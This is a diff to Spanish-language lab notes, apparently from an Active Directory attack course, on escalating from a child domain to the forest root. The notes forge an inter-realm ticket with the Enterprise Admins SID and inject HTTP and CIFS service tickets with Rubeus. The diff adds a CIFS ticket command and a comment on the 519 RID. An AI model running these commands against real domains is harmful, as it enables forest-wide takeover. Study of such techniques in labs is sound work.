@@ -83,6 +83,7 @@ Paso 4 (Abusar de la forma 1):
 	# /rc4      → trust key (hash NTLM) de la relación de confianza hijo → padre  (IMPORTANTE)
 	# /sid      → SID del dominio hijo
 	# /sids     → SID del grupo Enterprise Admins del dominio padre (S-1-5-21-...-519) — otorga privilegios en todo el bosque
+	# 519       → El 519 al final del sid es importante para que funcione 
 	# /ldap     → consulta al DC para obtener atributos del usuario automáticamente
 	# /user     → usuario Administrator a impersonar en el ticket forjado
 	# /nowrap   → muestra el ticket en base64 sin saltos de línea para facilitar su copia
@@ -94,9 +95,14 @@ Paso 4 (Abusar de la forma 2):
 ❯ .\Rubeus.exe asktgs /service:http/mcorp-dc.MONEYCORP.LOCAL /dc:mcorp-dc.MONEYCORP.LOCAL /ptt /ticket:<FORGED TICKET>
 
 Paso 5 (Abusar de la forma 1): 
+# TICKET HTTP
 ❯ C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgs /service:http/mcorp-dc.MONEYCORP.LOCAL /dc:mcorp-dc.MONEYCORP.LOCAL /ptt /ticket:doIGPjCCBjqgAwIBBaED...
 # Usar el inter-realm TGT forjado para solicitar un TGS para un servicio del dominio padre e inyectarlo en la sesión actual — completa el escalado de dominio hijo a dominio padre.
 # FORGED TICKET = Es el resultado del comando anterior al forjar el ticket 
+
+# TICKET CIFS (SMB)
+❯ C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgs /service:cifs/mcorp-dc.MONEYCORP.LOCAL /dc:mcorp-dc.MONEYCORP.LOCAL /ptt /ticket:doIGPjCCBjqgAwIBBaED...
+
 
 Paso 5 (Abusar de la forma 2):
 ❯ C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgs /service:cifs/eurocorp-dc.eurocorp.LOCAL /dc:eurocorp-dc.eurocorp.LOCAL /ptt /ticket:doIGPjCCBjqgAwIBBaED...
